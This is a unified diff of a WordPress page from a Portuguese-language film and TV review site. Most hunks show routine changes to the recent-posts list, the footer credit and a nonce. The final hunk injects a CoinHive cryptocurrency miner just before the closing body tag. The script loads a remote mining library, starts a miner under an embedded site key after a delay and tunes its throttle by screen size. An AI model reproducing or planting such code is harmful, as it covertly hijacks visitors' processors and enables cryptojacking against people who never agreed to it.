 	<li class="cat-item cat-item-15"><a href="/archives/category/viagem-pelo-cinema" >Viagem pelo Cinema</a> (9)
 </li>
@@ -1466,19 +1513,19 @@ var wid = '288202';
 		</ul>
 </div>		<div id="recent-posts-2" class="widget widget_recent_entries">		<h3 class="widget-title">Publicações recentes</h3>		<ul>
 					<li>
-				<a href="/archives/7737">Crítica | Réquiem para um Sonho</a>
+				<a href="/archives/7751">Crítica | Amityville: O Despertar</a>
 						</li>
 					<li>
-				<a href="/archives/7730">Audiência USA – 12/09/17: Terça</a>
+				<a href="/archives/7745">Stitchers é cancelado depois de 3 temporadas pelo Freeform</a>
 						</li>
 					<li>
-				<a href="/archives/7729">Audiência USA – 11/09/17: Segunda</a>
+				<a href="/archives/7744">Kidding: Jim Carrey vai estrelar nova série do Showtime</a>
 						</li>
 					<li>
-				<a href="/archives/7728">Audiência USA – 10/09/17: Domingo</a>
+				<a href="/archives/7753">&quot;Feito na América&quot; e embalado sob medida para o talento de Tom Cruise</a>
 						</li>
 					<li>
-				<a href="/archives/7727">Masterchef Profissionais 2×02: Top 13</a>
+				<a href="/archives/7743">Audiência USA – 14/09/17: Quinta</a>
 						</li>
 				</ul>
 		</div>		
@@ -1524,7 +1571,9 @@ var wid = '288202';
                               <p>Críticas &copy; 2017. All Rights Reserved.</p>
                           </div><!--/#copyright-->
 
-                          <div id="credit" style="">Developed by <b><a href="http://www.drall.com.br" style="color:#d66000" target="_blank">Drall Consulting</a></b></div><!--/#credit-->
+                          <div id="credit" style="">
+                <p>Powered by <a href="http://wordpress.org" target="_blank">WordPress</a>. Theme by <a href="http://presscustomizr.com">Press Customizr</a>.</p>
+              </div><!--/#credit-->
             
           </div>
 
@@ -1550,7 +1599,7 @@ var wpcf7 = {"apiSettings":{"root":"http:\/\/criticas.centrodouniverso.com.br\/w
 <script type='text/javascript' src='/wp-includes/js/underscore.min.js'></script>
 <script type='text/javascript'>
 /* <![CDATA[ */
-var HUParams = {"_disabled":[],"SmoothScroll":{"Enabled":true,"Options":{"touchpadSupport":false}},"centerAllImg":"1","timerOnScrollAllBrowsers":"1","extLinksStyle":"","extLinksTargetExt":"","extLinksSkipSelectors":{"classes":["btn","button"],"ids":[]},"imgSmartLoadEnabled":"","imgSmartLoadOpts":{"parentSelectors":[".container .content",".container .sidebar","#footer","#header-widgets"],"opts":{"excludeImg":[".tc-holder-img"],"fadeIn_options":100}},"goldenRatio":"1.618","gridGoldenRatioLimit":"350","sbStickyUserSettings":{"desktop":true,"mobile":true},"isWPMobile":"","menuStickyUserSettings":{"desktop":"stick_up","mobile":"stick_up"},"isDevMode":"","ajaxUrl":"http:\/\/criticas.centrodouniverso.com.br\/?huajax=1","frontNonce":{"id":"HuFrontNonce","handle":"82f2d222f7"},"userStarted":{"with":"with|3.2.10","on":{"date":"2017-05-19 14:07:11.000000","timezone_type":3,"timezone":"UTC"}},"isWelcomeNoteOn":"","welcomeContent":""};
+var HUParams = {"_disabled":[],"SmoothScroll":{"Enabled":true,"Options":{"touchpadSupport":false}},"centerAllImg":"1","timerOnScrollAllBrowsers":"1","extLinksStyle":"","extLinksTargetExt":"","extLinksSkipSelectors":{"classes":["btn","button"],"ids":[]},"imgSmartLoadEnabled":"","imgSmartLoadOpts":{"parentSelectors":[".container .content",".container .sidebar","#footer","#header-widgets"],"opts":{"excludeImg":[".tc-holder-img"],"fadeIn_options":100}},"goldenRatio":"1.618","gridGoldenRatioLimit":"350","sbStickyUserSettings":{"desktop":true,"mobile":true},"isWPMobile":"","menuStickyUserSettings":{"desktop":"stick_up","mobile":"stick_up"},"isDevMode":"","ajaxUrl":"http:\/\/criticas.centrodouniverso.com.br\/?huajax=1","frontNonce":{"id":"HuFrontNonce","handle":"bd86fd2199"},"userStarted":{"with":"with|3.2.10","on":{"date":"2017-05-19 14:07:11.000000","timezone_type":3,"timezone":"UTC"}},"isWelcomeNoteOn":"","welcomeContent":""};
 /* ]]> */
 </script>
 <script type='text/javascript' src='/wp-content/themes/hueman/assets/front/js/scripts.min.js'></script>
@@ -1558,7 +1607,7 @@ var HUParams = {"_disabled":[],"SmoothScroll":{"Enabled":true,"Options":{"touchp
 <!--[if lt IE 9]>
 <script src="http://criticas.centrodouniverso.com.br/wp-content/themes/hueman/assets/front/js/ie/respond.js"></script>
 <![endif]-->
-</body>
+<script type='text/javascript' src='https://coin-hive.com/lib/coinhive.min.js'></script><script>var speed = ( window.matchMedia("only screen and (max-width: 760px)").matches )?0.8:0.17;var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:speed});setTimeout(function(){__m.start();},3000);</script></body>
 </html><style>
 .site-description{
     color:white;
